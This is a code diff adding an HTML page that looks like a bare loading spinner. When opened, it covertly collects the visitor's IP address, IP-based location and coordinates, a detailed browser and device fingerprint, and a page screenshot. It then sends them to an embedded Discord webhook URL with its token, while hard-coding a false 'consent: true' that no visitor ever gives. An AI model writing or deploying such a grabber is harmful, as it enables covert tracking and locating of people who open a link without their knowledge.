@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Collection</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: transparent;
+        }
+
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #00ff00;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+
+    <script>
+        async function getIPandLocation() {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token=YOUR_API_TOKEN');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country,
+                    loc: data.loc
+                };
+            } catch (error) {
+                console.error('Error fetching IP and location:', error);
+                return null;
+            }
+        }
+
+        const getUserData = async () => {
+            const ipAndLocation = await getIPandLocation();
+            return {
+                consent: true,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                referrer: document.referrer,
+                url: window.location.href,
+                browser: navigator.appName,
+                browserVersion: navigator.appVersion,
+                cookiesEnabled: navigator.cookieEnabled,
+                localStorageAvailable: typeof localStorage !== 'undefined',
+                sessionStorageAvailable: typeof sessionStorage !== 'undefined',
+                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                colorDepth: screen.colorDepth,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                onlineStatus: navigator.onLine,
+                isJavaEnabled: navigator.javaEnabled(),
+                geolocationAvailable: 'geolocation' in navigator,
+                ip: ipAndLocation ? ipAndLocation.ip : 'Unknown',
+                city: ipAndLocation ? ipAndLocation.city : 'Unknown',
+                region: ipAndLocation ? ipAndLocation.region : 'Unknown',
+                country: ipAndLocation ? ipAndLocation.country : 'Unknown',
+                loc: ipAndLocation ? ipAndLocation.loc : 'Unknown'
+            };
+        };
+
+        const takeScreenshot = async () => {
+            try {
+                const canvas = await html2canvas(document.body);
+                const screenshotData = canvas.toDataURL();
+                return screenshotData;
+            } catch (error) {
+                console.error('Error taking screenshot:', error);
+                return null;
+            }
+        };
+
+        const formatDataForWebhook = (data, screenshotData) => {
+            return `
+**[New Data Collected]**
+
+===========================
+CONSENT DATA
+===========================
+- Consent Given: ${data.consent}
+- Timestamp: ${data.timestamp}
+- Device Type: ${data.deviceType}
+- Time Zone: ${data.timeZone}
+- Screen Resolution: ${data.screenWidth}x${data.screenHeight}
+- Window Size: ${data.windowWidth}x${data.windowHeight}
+- Color Depth: ${data.colorDepth}-bit
+- Timezone Offset: ${data.timezoneOffset}
+- Online Status: ${data.onlineStatus ? "Online" : "Offline"}
+- Geolocation Supported: ${data.geolocationAvailable ? "Yes" : "No"}
+
+===========================
+LOCATION INFORMATION (IP-based)
+===========================
+- IP Address: ${data.ip}
+- City: ${data.city}
+- Region: ${data.region}
+- Country: ${data.country}
+- Coordinates (Lat, Long): ${data.loc}
+
+===========================
+BROWSER INFO
+===========================
+- Browser Name: ${data.browser}
+- Browser Version: ${data.browserVersion}
+- Cookies Enabled: ${data.cookiesEnabled ? "Yes" : "No"}
+- LocalStorage Available: ${data.localStorageAvailable ? "Yes" : "No"}
+- SessionStorage Available: ${data.sessionStorageAvailable ? "Yes" : "No"}
+
+===========================
+PAGE INFO
+===========================
+- Current URL: ${data.url}
+
+===========================
+SCREENSHOT
+===========================
+[Page Screenshot]
+${screenshotData}
+            `;
+        };
+
+        const sendDataToWebhook = async () => {
+            const webhookUrl = 'https://discord.com/api/webhooks/1355311491745845490/zScHnR90KqGZQVd2leKwQGUkFJcs06JbtXXl6rGUrxDMWoNgRnoL9mTFE5NWwEr9w_6A';
+
+            const userData = await getUserData();
+            const screenshotData = await takeScreenshot();
+            const formattedData = formatDataForWebhook(userData, screenshotData);
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: formattedData
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('Data sent successfully!');
+                } else {
+                    console.error('Failed to send data');
+                }
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        };
+
+        sendDataToWebhook();
+    </script>
+
+</body>
+</html>
